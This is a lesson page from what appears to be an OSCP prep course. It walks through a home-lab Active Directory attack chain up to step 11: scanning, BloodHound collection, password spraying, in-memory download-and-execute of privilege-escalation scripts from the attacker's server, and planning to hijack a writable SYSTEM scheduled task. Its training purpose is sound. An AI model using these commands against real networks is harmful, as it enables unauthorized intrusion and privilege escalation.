
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 43 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_11

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/555933)[About this chain](https://hackerblueprint.com/labs#chain-11)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2011%3A%20Cold%20Storage)

Tags

Port ScanningSMB EnumerationAD EnumerationPassword ReuseWindows PrivescPassword SprayingADCS AbuseKernel Exploits

PreviousCompletedNext: Chain 12: DelegateContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 11: Cold Storage

Step 1 of 18

Close

0:00 / 1:36:00

Auto

1

Stage the lab and map the network

BackNext step

Your lab addressesDC IPCLIENT-1 IPCLIENT-2 IPYour IPLab subnet

1. 1Stage the lab and map the network_0:00_
    
    We start in a folder for this chain, and the lab has already put one credential in it: the domain user j.miller with a password. A quick interface check tells us our own address, and an SMB sweep of that whole subnet finds three Windows hosts in one domain, the controller DC01 and two clients. Their addresses go into a file called ips, and a full TCP scan runs against that list while we set up the next tool.
    
    Kali
    
    ```
    cd AD_CHAIN_11
    ```
    
    Copy
    
    Moves into the folder for this chain, where the notes, scans and loot will live.
    
    **Why**One folder per chain keeps the scan output, the user list and the hashes together when the report is written.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder and shows the one file the lab left there.
    
    **Why**The file name tells us what the lab handed over before we open it.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the starting credential: the account j.miller and its password.
    
    **Why**Every step below authenticates with this one account, so we read it once instead of retyping it.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Shows our interfaces and addresses, including the address on the lab network.
    
    **Why**The subnet to sweep is the one our own interface sits on, and the same address becomes our callback and file server later.
    
    Kali
    
    ```
    netexec smb 10.0.2.0/24
    ```
    
    Copy
    
    Sweeps the subnet over SMB with no credentials and prints one line for each host that answers.
    
    **Why**One sweep gives us the live hosts, their names, the domain and the signing state, all from the same reply.
    
    Kali
    
    ```
    gedit ips
    ```
    
    Copy
    
    Opens the editor to create the file ips.
    
    **Why**The scan takes its target list from a file, so the three hosts are written down once and reused by every tool.
    
    Kali (gedit)
    
    ```
    10.0.2.9
    10.0.2.132
    10.0.2.133
    ```
    
    Copy
    
    The file ips holds the three addresses, one per line: the controller `DC_IP`, then `CLIENT1_IP` and `CLIENT2_IP`.
    
    **Why**Every later tool takes the same list, so one file keeps the target set consistent.
    
    Kali
    
    ```
    nmap -v -p- -sV -sC -Pn -iL ips -oN nmap.log
    ```
    
    Copy
    
    Scans all 65535 TCP ports on the three hosts with the version and default script probes, and saves the output to nmap.log.
    
    **Why**-p- is the only way to find services on high ports, which is where the first client's RDP hides; -iL reads the target list and -Pn skips the discovery step that some lab hosts block.
    
    **Tip**Start the port scan in the first terminal tab and set up BloodHound in the second. A second scan started before the first finishes only slows both down.
    
2. 2Start BloodHound and clear the port clash_1:48_
    
    BloodHound Community Edition comes as a compose file behind the project's short link. The first start fails, because the stack from the previous chain is still running and holds ports 7474 and 8080. We look at what is listening, then remove the old containers and their volumes, and start the same stack again; this time all three containers come up and the generated admin password appears in the log of the bloodhound container.
    
    Kali
    
    ```
    curl -L https://ghst.ly/getbhce -o docker-compose.yml
    ```
    
    Copy
    
    Downloads the compose file of BloodHound Community Edition into the current folder.
    
    **Why**The file pins the app, the graph database and the database container together, so the rest of the setup is one command.
    
    Kali
    
    ```
    docker-compose pull && docker-compose up -d
    ```
    
    Copy
    
    Pulls the images and starts the stack in the background.
    
    **Why**The first start is also the test that the ports are free; here it fails and names the port that is already taken.
    
    Kali
    
    ```
    ss -lntu
    ```
    
    Copy
    
    Lists every local port that is listening, over TCP and UDP.
    
    **Why**The error named 7474, so we look at the full picture before removing anything: an older BloodHound stack is behind all of them.
    
    Kali
    
    ```
    docker-compose logs bloodhound | grep -i passw
    ```
    
    Copy
    
    Reads the log of the bloodhound container and keeps the lines that mention a password.
    
    **Why**The admin password is generated on the first start and printed once, and this is where we copy it from.
    
    Kali
    
    ```
    docker-compose down -v
    ```
    
    Copy
    
    Stops the stack and removes its volumes.
    
    **Why**The old containers hold the ports, so the previous project has to go before the new one can bind them.
    
    Kali
    
    ```
    docker volume ls
    ```
    
    Copy
    
    Lists the docker volumes that still exist.
    
    **Why**The volumes of a removed project often stay behind, and they are what keeps the old database alive.
    
    Kali
    
    ```
    docker ps
    ```
    
    Copy
    
    Lists the running containers, including the ones from the previous chain.
    
    **Why**The ports belong to containers that are still up, so we need to see their names before removing them.
    
    Kali
    
    ```
    docker rm -f $(docker ps -aq); docker volume prune -f
    ```
    
    Copy
    
    Force-removes every container and then deletes all volumes that no container uses.
    
    **Why**Two commands in one line clear both the processes that hold the ports and the data folders that would otherwise keep state.
    
    Kali
    
    ```
    docker volume rm ad_chain_10_neo4j-data ad_chain_10_postgres-data
    ```
    
    Copy
    
    Removes the two named data volumes of the previous chain.
    
    **Why**Volumes whose containers are gone survive a prune when something still references them, and these two are what the old project left.
    
    **Tip**Run the same start command again after the cleanup. If it still fails, the port named in the error is the one to hunt: `ss -lntu` shows the process behind it.
    
3. 3Collect the domain and load it into BloodHound_5:00_
    
    With the stack up we let netexec do the collection. It binds to LDAP as j.miller, walks every object type the collection asks for, and writes one zip with all of it. The zip is copied to /tmp so the browser file picker can reach it without hunting through root's home.
    
    In the browser we open [http://localhost:8080](http://localhost:8080/) and sign in as admin with the password printed by the container log. Then we go to the upload area, drop the zip from /tmp, and wait for the import to finish. The graph now holds the users, groups, sessions and ACLs of the whole domain.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the account and password we collected with.
    
    **Why**The LDAP collection needs a credential; this is the same one the lab gave us.
    
    Kali
    
    ```
    netexec ldap 10.0.2.9 -u j.miller -p 'Marines#1' --bloodhound --collection All --dns-server 10.0.2.9
    ```
    
    Copy
    
    Binds to LDAP on the controller as j.miller and collects every object type BloodHound understands into one zip.
    
    **Why**--collection All covers groups, sessions, ACLs and the remote access rights, and --dns-server points name resolution at the controller so the domain name resolves.
    
    Kali
    
    ```
    cp /root/.nxc/logs/DC01_DC_IP_2026-07-08_065958_bloodhound.zip /tmp
    ```
    
    Copy
    
    Copies the collected zip to /tmp.
    
    **Why**The browser runs as our desktop user, and /tmp is the folder it can always open; the file name carries the date and time of the run, so it never overwrites an older collection.
    
    **Tip**The import is finished when the upload dialog closes and the database panel shows the new counts. Uploading the same zip twice duplicates nodes only until the import job finishes, so wait for it.
    
4. 4Query BloodHound, then build the user and password lists_12:12_
    
    The first question the graph answers is whether any account can be roasted. In the Explore tab we paste the AS-REP query:
    
    MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u LIMIT 100
    
    It returns no rows, so pre-authentication is enabled on every user and there is no AS-REP hash to take. Kerberoasting is checked the same way, and it also comes back empty. That leaves passwords as the way in, so we ask the controller for the user list.
    
    The full listing is wide, so the first run pipes it through a filter that keeps only the name column and writes it to a file called users. The second run prints the same list with the descriptions, which name several service and privileged accounts.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the working folder, now with the downloaded compose file, the target list, the scan and the credential file.
    
    **Why**A quick look at the folder confirms the scan log and the credential file are both here before we start using them.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the starting credential again.
    
    **Why**The user enumeration and every spray below need the same password, and reading it from the file avoids a typo.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u j.miller -p 'Marines#1' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print $5}' | tee users
    ```
    
    Copy
    
    Asks the controller for the domain users and keeps only the name column, saving it to the file users.
    
    **Why**The raw listing is mostly headers and banners; taking the fifth field leaves one user name per line, which is the form the spray needs.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u j.miller -p 'Marines#1' --users
    ```
    
    Copy
    
    Prints the same user listing in full, so the description column is readable.
    
    **Why**The descriptions say which accounts are service or legacy accounts, and those are the ones worth spraying first.
    
    **Tip**Read the descriptions, not just the names. An account described as a backup or legacy service account is the one most likely to share a password with a machine.
    
5. 5Spray one password across every host_16:48_
    
    The first password to try is the one we already hold, and the first place to try it is every account on every host. netexec takes the two files we just built and tries each name with each password, keeping going after a hit. Only j.miller answers, which tells us the given credential is not reused anywhere else, but it is now confirmed on all three machines over SMB and over WMI.
    
    WinRM refuses the same account on all three hosts, so a remote PowerShell session is out. RDP accepts it on the controller and on the second client, and the first client is missing from the results, which matches the odd port the scan found. After reading the module help for the port flag, we point the same check at 13389 and CLIENT-1 answers with a full desktop right.
    
    Kali
    
    ```
    gedit pass
    ```
    
    Copy
    
    Opens the editor to create the file pass, the list of passwords to try.
    
    **Why**netexec takes a file for -p, so one spray tests every name in the file, and we keep adding to the same file as more passwords turn up.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Tries every user in users with every password in pass over SMB on all three hosts, and keeps going after a success.
    
    **Why**A single reused password is the fastest way in when nobody can be roasted, and --continue-on-success reports every hit instead of stopping at the first.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success | grep -vi STATUS_LOGON_FAILURE
    ```
    
    Copy
    
    Runs the same spray and drops the failure lines from the output.
    
    **Why**One valid line among dozens of failures is easy to miss, so the filter leaves only the accounts that worked.
    
    Kali
    
    ```
    netexec smb ips -u j.miller -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the SMB check with only j.miller, against the password file.
    
    **Why**Narrowing to one account shows on which of the three hosts that account is accepted, which the mixed spray blurs.
    
    Kali
    
    ```
    netexec wmi ips -u j.miller -p pass --continue-on-success
    ```
    
    Copy
    
    Tests the same credential over WMI, which rides on RPC port 135.
    
    **Why**A password can work over SMB and still fail over WMI, and WMI is a way to run commands without any shell.
    
    Kali
    
    ```
    netexec winrm ips -u j.miller -p pass --continue-on-success
    ```
    
    Copy
    
    Tests WinRM on port 5985 with the same credential.
    
    **Why**WinRM gives a clean remote PowerShell session, so it is worth checking before falling back to a desktop.
    
    Kali
    
    ```
    netexec rdp ips -u j.miller -p pass --continue-on-success
    ```
    
    Copy
    
    Tests RDP on port 3389 on all three hosts with the same credential.
    
    **Why**RDP is the interactive route, and the missing host in the results is itself a finding.
    
    Kali
    
    ```
    netexec rdp --help
    ```
    
    Copy
    
    Prints the help of the RDP module, including the connection options.
    
    **Why**The help shows the flag that changes the port, which is what the next command needs.
    
    Kali
    
    ```
    netexec rdp ips -u j.miller -p pass --port 13389
    ```
    
    Copy
    
    Repeats the RDP check against port 13389, the high port the scan showed on the first client.
    
    **Why**The client does not listen on 3389, so the account only appears to work there once the tool is aimed at the real port; Pwn3d means the account may open an interactive session.
    
    **Tip**Always add the port check for RDP and WinRM. A host that is silent on 3389 may be answering on a high port, and the scan already told you which.
    
6. 6RDP into CLIENT-1 on the high port_20:10_
    
    We connect with an RDP client to `CLIENT1_IP` on port 13389 and sign in as j.miller, accepting the certificate warning. The desktop is a normal user desktop, and the first thing to do in any new session is to read the token we hold.
    
    The check lists the groups and privileges of the account. There is no administrative group and no privilege that can be abused: the token has only what every interactive user has. That settles that this account cannot escalate by itself, so the next move is to look for a weakness on the machine rather than in the directory.
    
    CLIENT-1 (RDP)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the account name, its groups and every privilege of the current token.
    
    **Why**Before running any tool we need to know what this session can already do; nothing here grants admin, so the escalation has to come from the host.
    
    **Tip**Run `whoami /all` in every new session. It is the fastest way to see whether the account already has an administrative group or a privilege such as SeImpersonate.
    
7. 7Serve our tools and run the checkers_23:12_
    
    The machine has no internet and no share we can write to yet, so we bring the tools from our side. We go to the folder of preinstalled Windows tools, start a plain HTTP server on port 80 in it, and note the staging folder on the target.
    
    On the client we change to C:\windows\tasks, which every user can write to, and pull each script straight from our server into memory with the download alias of PowerShell. The first checker reports a hijackable path under the user's AppData, which is the classic false positive and not a way in. The second one runs its long list of checks and writes the result to a log file we can search later. A port listing in a second window shows what else the host runs locally, including the web port and the high RDP port.
    
    Kali
    
    ```
    cd /opt/tools/
    ```
    
    Copy
    
    Moves to the folder where the course keeps its Windows tools.
    
    **Why**The tool folder is shared by every chain, so its scripts are already downloaded and we only have to serve them.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the tool folders: pivoting, privesc and webshells.
    
    **Why**The next step needs the privilege escalation scripts, so we check which folder holds them.
    
    Kali
    
    ```
    cd privesc
    ```
    
    Copy
    
    Moves into the privesc folder.
    
    **Why**This is the folder the HTTP server will publish, so the target only has to ask for a file name.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the scripts in the folder: PowerUp, PrivescCheck, winPEAS, GodPotato and others.
    
    **Why**Seeing the exact names avoids a failed download later, when the target reports a 404.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Starts a Python HTTP server on port 80, serving the current folder.
    
    **Why**A plain web server is the simplest way to move files to a Windows host, and it leaves no share to clean up.
    
    CLIENT-1 (PowerShell)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Changes into the tasks folder on the client.
    
    **Why**C:\Windows\Tasks is writable by ordinary users, so it is the safe place to stage files on a host where we are not admin.
    
    CLIENT-1 (PowerShell)
    
    ```
    wget 10.0.2.135/PowerUp.ps1|iex;Invoke-AllChecks
    ```
    
    Copy
    
    Downloads PowerUp and runs it in memory, then runs every check.
    
    **Why**Running from memory leaves no script on disk; Invoke-AllChecks looks for weak service permissions and unquoted paths in one pass.
    
    CLIENT-1 (PowerShell)
    
    ```
    wget 10.0.2.135/PrivescCheck.ps1|iex;Invoke-PrivescCheck > priv.log
    ```
    
    Copy
    
    Downloads PrivescCheck, runs it and redirects the whole report into priv.log.
    
    **Why**The script prints hundreds of lines; saving them lets us search for the few lines that matter instead of losing them in the scroll.
    
    CLIENT-1 (PowerShell)
    
    ```
    netstat -ano | findstr /i listening
    ```
    
    Copy
    
    Lists every listening socket with its owning process id, filtered to the listening state.
    
    **Why**The scan only saw ports that were reachable from outside; this shows what the host exposes locally and which process owns each port.
    
    **Tip**The hijackable path in the user's AppData and the wlbsctrl.dll hint are false positives on current Windows. Look at service binaries and scheduled tasks instead.
    
8. 8Search the filesystem for handover notes_29:20_
    
    Automated checks found nothing usable, so we walk the disk by hand. The profile tree shows a fourth profile, svc_backup, which no ordinary user account would need on a workstation. At the root, the IT folder stands out because a default Windows install does not have one, next to inetpub.
    
    Inside IT are three text files: a handover note that names a reporting portal and a retired file server, a host inventory, and a file of legacy VPN credentials. The password in the last one is refused everywhere we test it, but it belongs in the password file because it may still be reused somewhere the tools have not looked. The Recovery folder answers with access denied, which is expected and not worth forcing.
    
    CLIENT-1 (PowerShell)
    
    ```
    tree c:\users
    ```
    
    Copy
    
    Prints the folder tree of C:\Users without files.
    
    **Why**The list of profiles is the fastest way to spot an account that should not be on a workstation.
    
    CLIENT-1 (PowerShell)
    
    ```
    tree /a /f c:\users
    ```
    
    Copy
    
    Prints the same tree with files, including hidden ones.
    
    **Why**Hidden files in a profile often hold configuration with credentials, so the full tree is worth the extra output.
    
    CLIENT-1 (PowerShell)
    
    ```
    cd c:\
    ```
    
    Copy
    
    Moves to the root of the system drive.
    
    **Why**The interesting folders in these labs sit next to the Windows folder, not inside a user profile.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the contents of the root folder.
    
    **Why**inetpub and IT are not part of a default install; anything that was added by hand is worth opening.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls -force
    ```
    
    Copy
    
    Lists the root again including hidden and system items.
    
    **Why**Hidden folders such as Recovery and ProgramData are skipped by a plain listing and often hold notes or backups.
    
    CLIENT-1 (PowerShell)
    
    ```
    cd .\inetpub\
    ```
    
    Copy
    
    Changes into the inetpub folder.
    
    **Why**A web root on a workstation means a local web service, and web folders often keep configuration or logs.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the files in the web root folder.
    
    **Why**An empty web root tells us this is not the way in, so we go back to the folders at the root.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls -force .\Recovery\
    ```
    
    Copy
    
    Lists the Recovery folder, including hidden items.
    
    **Why**Recovery images can hold an administrator password file; the folder is readable even when its content is not.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls -force .\Recovery\OEM\
    ```
    
    Copy
    
    Tries to list the OEM folder inside Recovery.
    
    **Why**The access denied answer is information too, and it confirms that this folder is protected from our user.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls -force .\IT\
    ```
    
    Copy
    
    Lists the IT folder at the root, including hidden files.
    
    **Why**Three text files with recent dates in a folder that should not exist is exactly what a handover leaves behind.
    
    CLIENT-1 (PowerShell)
    
    ```
    cat .\IT\handover.txt
    ```
    
    Copy
    
    Prints the handover note.
    
    **Why**The note says which servers are retired and which portal is being decommissioned, so later scans are not wasted on dead hosts.
    
    CLIENT-1 (PowerShell)
    
    ```
    cat .\IT\hosts_backup.txt
    ```
    
    Copy
    
    Prints the host inventory.
    
    **Why**It names the controller and an old file server, which explains the shares that were moved to this client.
    
    CLIENT-1 (PowerShell)
    
    ```
    cat .\IT\old_vpn_creds.txt
    ```
    
    Copy
    
    Prints the legacy VPN credential file.
    
    **Why**A password that was only ever meant for a temporary VPN account is still a password, and people reuse passwords.
    
    **Tip**Read every note twice: once for credentials, once for the picture of the network. This inventory told us which hosts are real before we scanned them.
    
9. 9Test the retired VPN password everywhere_32:24_
    
    The VPN password goes into the password file next to the one we started with, and the spray runs again against every user on every host, over RDP and over SMB. Nothing new comes back: the legacy account was removed from the directory, and its password is not reused by any live user. A retired credential that still opens nothing is still worth thirty seconds, because it costs one line in the file and occasionally opens a door.
    
    We then read the local accounts of the client and the domain list from the target itself. The domain list matches the file we built, which confirms the earlier filtering, and the local list shows a single real user, Sophia. A local administrator check with a known local password shows how --local-auth differs from the domain logon: it is answered by the machine, not by the controller. That is useful to know, but a local admin on a host we can already use does not move the chain, so we leave it there.
    
    Kali
    
    ```
    cat users
    ```
    
    Copy
    
    Prints the user list built from the controller.
    
    **Why**The spray takes its names from this file, so we check that the list is the one we expect before adding a password to it.
    
    Kali
    
    ```
    netexec rdp ips -u j.miller -p pass --port 13389
    ```
    
    Copy
    
    Runs the RDP check on the high port again, now with the two passwords in the file.
    
    **Why**The privileged RDP path we found earlier is the one worth retesting with a new password first.
    
    Kali
    
    ```
    netexec rdp ips -u j.miller -p pass --continue-on-success
    ```
    
    Copy
    
    Runs the RDP check on the default port with both passwords, keeping every result.
    
    **Why**This shows which of the two passwords is accepted where, and which hosts answer on 3389 at all.
    
    Kali
    
    ```
    netexec rdp ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Runs the full user by password spray over RDP on the default port.
    
    **Why**A retired service account is a common weak spot, so the new password is tried against every user, not only j.miller.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Runs the same full spray over SMB.
    
    **Why**SMB is the fastest protocol to spray and the one most likely to confirm a hit before slower protocols are tried.
    
    CLIENT-1 (PowerShell)
    
    ```
    net user
    ```
    
    Copy
    
    Prints the local accounts of the client.
    
    **Why**The local SAM is a separate set of accounts from the domain, and a workstation with an old local user is a common way across.
    
    CLIENT-1 (PowerShell)
    
    ```
    net user /domain
    ```
    
    Copy
    
    Asks the controller for the domain account list.
    
    **Why**The answer from the target itself confirms that the list we built on Kali is complete.
    
    Kali
    
    ```
    netexec smb ips -u Sophia -p pass --local-auth
    ```
    
    Copy
    
    Tests the two passwords against the local account Sophia, using the machine's own account database.
    
    **Why**--local-auth sends the logon to the host's SAM instead of the domain, so a local password can be tested without the controller seeing it.
    
    Kali
    
    ```
    netexec smb ips -u Sophia -p 'Password112233!' --local-auth
    ```
    
    Copy
    
    Tests one known local password against the same account on all three hosts.
    
    **Why**The client answers with Pwn3d, which proves the account is a local administrator there; the other two hosts refuse it because they keep their own SAM.
    
    **Tip**--local-auth is easy to forget and easy to overvalue. It only tests local accounts, so a hit is only useful if that local administrator adds reach you did not already have.
    
10. 10Spider the shares and rule out the other paths_35:44_
    
    Three ways forward are left to test in order: shares, certificate services and missing patches. The spider module walks every share j.miller can read, downloads the small files it finds and writes one JSON index per host. On the controller only the default policy shares are readable, and their content is the stock domain policy. On the client it downloads the same three text files we already read, which is a good check that the module works but adds nothing new.
    
    The client cannot answer on LDAPS at all, and the controller resets the TLS handshake even with debug output, which means no certificate authority is installed and the certificate path is closed. The system information then gives the exact build and the list of installed hotfixes. Windows Exploit Suggester turns that into 2398 candidate vulnerabilities, which is useless until it is narrowed to the missing patches that are critical, and that leaves a single candidate, for which no public exploit is available. The chain moves on.
    
    Kali
    
    ```
    netexec smb ips -u j.miller -p pass --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
    ```
    
    Copy
    
    Walks every share with the j.miller credential, downloads the files it can read and writes a JSON index for each host.
    
    **Why**The share spider finds the files a human would take an hour to click through, and the per-host index keeps track of where each file came from.
    
    Kali
    
    ```
    cat 10.0.2.132.json
    ```
    
    Copy
    
    Prints the index of the files found on the first client.
    
    **Why**The index names the share and path of every downloaded file, which is what makes the downloaded copies usable as evidence.
    
    Kali
    
    ```
    cat 10.0.2.9.json
    ```
    
    Copy
    
    Prints the index of the files found on the controller.
    
    **Why**The controller's only readable shares are the two policy shares, and the index confirms there was nothing else.
    
    Kali
    
    ```
    cat starting_credentials.txt
    ```
    
    Copy
    
    Prints the starting credential again.
    
    **Why**certipy needs the account in user@domain form with the password, so we copy both from the file.
    
    Kali
    
    ```
    certipy-ad find -u j.miller@hackerblueprint.local -p 'Marines#1' -dc-ip 10.0.2.9 -vulnerable -stdout
    ```
    
    Copy
    
    Asks the certificate service of the controller for every vulnerable template and prints the result.
    
    **Why**If a certificate authority were installed, a vulnerable template would be a way to a domain administrator, so it is checked early.
    
    Kali
    
    ```
    certipy-ad find -u j.miller@hackerblueprint.local -p 'Marines#1' -dc-ip 10.0.2.9 -vulnerable -stdout -debug
    ```
    
    Copy
    
    Repeats the same query with debug output.
    
    **Why**The first run failed inside the TLS handshake, and the debug trace says whether that is a wrong address or a missing service.
    
    Kali
    
    ```
    cat ips
    ```
    
    Copy
    
    Prints the target list of three addresses.
    
    **Why**The two clients have not been tried yet, and their addresses are in this file.
    
    Kali
    
    ```
    certipy-ad find -u j.miller@hackerblueprint.local -p 'Marines#1' -dc-ip 10.0.2.133 -vulnerable -stdout
    ```
    
    Copy
    
    Runs the certificate query against the second client instead of the controller.
    
    **Why**A member server can run a certificate authority too, so the check is repeated against each host in turn.
    
    CLIENT-1 (PowerShell)
    
    ```
    systeminfo
    ```
    
    Copy
    
    Prints the operating system, the build, the domain and the installed hotfixes.
    
    **Why**The build number and the patch order decide which kernel exploits apply, and the logon server field confirms the controller.
    
    Kali
    
    ```
    git clone https://github.com/bitsadmin/wesng.git
    ```
    
    Copy
    
    Clones the Windows Exploit Suggester repository.
    
    **Why**The tool needs a local copy of the patch database to compare the hotfix list against.
    
    CLIENT-1 (PowerShell)
    
    ```
    systeminfo | clip
    ```
    
    Copy
    
    Copies the whole system information output to the clipboard.
    
    **Why**The text has to travel from the desktop session to our machine, and the clipboard is the one channel that always works over RDP.
    
    Kali
    
    ```
    cd wesng
    ```
    
    Copy
    
    Moves into the cloned tool folder.
    
    **Why**The script reads a file from its own folder by default, so the report goes here.
    
    Kali (gedit)
    
    ```
    gedit systeminfo.txt
    ```
    
    Copy
    
    Saves the pasted system information as systeminfo.txt in the tool folder.
    
    **Why**It is the input file the suggester reads, and saving it means the check can be repeated without touching the target again.
    
    Kali
    
    ```
    python3 wes.py --update-wes
    ```
    
    Copy
    
    Updates the local copy of the patch database.
    
    **Why**Newly published patches change which build numbers count as missing, so the data has to be current.
    
    Kali
    
    ```
    python3 wes.py systeminfo.txt
    ```
    
    Copy
    
    Compares the hotfix list with the database and prints every candidate vulnerability.
    
    **Why**The unfiltered run shows how many candidates the build has, which is a quick measure of an unpatched host.
    
    Kali
    
    ```
    python3 wes.py systeminfo.txt -e -s critical
    ```
    
    Copy
    
    Runs the same comparison keeping only critical vulnerabilities that have a public exploit.
    
    **Why**Two filters turn thousands of rows into workable candidates, which is what the exam clock allows.
    
    **Tip**certipy failing with a connection reset is the normal answer on a domain without a certificate authority. Note it in the report and move to the next technique instead of retrying.
    
11. 11A SYSTEM task runs a script we can rewrite_45:40_
    
    With the patching path closed, we look at what runs on the host on its own. There is no standard tool for that, so we ask the task scheduler for every task outside the Microsoft folder, first from PowerShell and then from cmd. The PowerShell run fails with a message about .TaskPath, because the outer shell expands the dollar variable before the inner PowerShell sees it; the same line typed in cmd works and shows one non-Microsoft task, BackupSvcWeb, in the running state.
    
    The detailed query on that task gives the three facts that matter: it runs as SYSTEM, it starts at system start, and it runs a PowerShell script in C:\ProgramData\BackupSvc. The script itself is harmless, a small listener that serves a static page, and that is the point: it is a decoy that makes the folder look like a real service. The permissions are what make it a way in. Both the ACL and icacls show that the Users group has modify rights on the file, so any user, including ours, can replace its content. The task then runs our content as SYSTEM at the next boot.
    
    We prove the write with a single word, then put the real payload in place: one net localgroup line that adds j.miller to the local administrators. The account check before the reboot shows an ordinary user token, and the restart is the last step, because the task only runs at start up.
    
    CLIENT-1 (PowerShell)
    
    ```
    cd c:\\windows\\tasks
    ```
    
    Copy
    
    Changes to the tasks folder, the writable staging area.
    
    **Why**We are about to write files on this host, and this folder is the one place every user can write to.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder and shows a leftover report from the earlier check.
    
    **Why**The folder is where our own output lands, so it is a good place to keep the task script too.
    
    CLIENT-1 (cmd)
    
    ```
    powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | Format-Table TaskName,TaskPath,State"
    ```
    
    Copy
    
    Asks the scheduler for every task whose path is not under the Microsoft folder and prints the name, path and state.
    
    **Why**Tasks outside the Microsoft folder are the ones a human installed, and one of them is bound to run something privileged.
    
    CLIENT-1 (cmd)
    
    ```
    schtasks /query /tn "backupsvcweb" /V /FO LIST
    ```
    
    Copy
    
    Prints the full configuration of the backupsvcweb task.
    
    **Why**The detail shows the account it runs as, the action it runs and the trigger, which decide whether it is a way to SYSTEM.
    
    CLIENT-1 (cmd)
    
    ```
    schtasks /query /V /FO LIST
    ```
    
    Copy
    
    Prints every task with full detail, then is stopped with Ctrl+C.
    
    **Why**The full dump is thousands of lines; the single named query above is the one that answers the question.
    
    CLIENT-1 (PowerShell)
    
    ```
    cat C:\\ProgramData\\BackupSvc\\decoy-web.ps1
    ```
    
    Copy
    
    Prints the script the task runs.
    
    **Why**Reading the action tells us whether it is a real service or a decoy, and what it does when it runs.
    
    CLIENT-1 (PowerShell)
    
    ```
    get-acl C:\\ProgramData\\BackupSvc\\decoy-web.ps1
    ```
    
    Copy
    
    Prints the access control list of the script file.
    
    **Why**The owner and the entries decide who can change the file that SYSTEM will execute.
    
    CLIENT-1 (PowerShell)
    
    ```
    get-acl C:\\ProgramData\\BackupSvc\\decoy-web.ps1|fl
    ```
    
    Copy
    
    Prints the same ACL in a long list, with the security descriptor.
    
    **Why**The list form shows the access mask next to each entry, which is what proves modify rights rather than read.
    
    CLIENT-1 (PowerShell)
    
    ```
    icacls C:\\ProgramData\\BackupSvc\\decoy-web.ps1
    ```
    
    Copy
    
    Prints the file permissions in the shorter icacls form.
    
    **Why**A second tool reading the same ACL removes any doubt: (M) on the Users group means write access for us.
    
    CLIENT-1 (PowerShell)
    
    ```
    echo 'test' > C:\\ProgramData\\BackupSvc\\decoy-web.ps1
    ```
    
    Copy
    
    Overwrites the script with the single word test.
    
    **Why**A harmless write proves the permission without leaving a payload behind while we still have to confirm the task will run it.
    
    CLIENT-1 (PowerShell)
    
    ```
    cat C:\\ProgramData\\BackupSvc\\decoy-web.ps1
    ```
    
    Copy
    
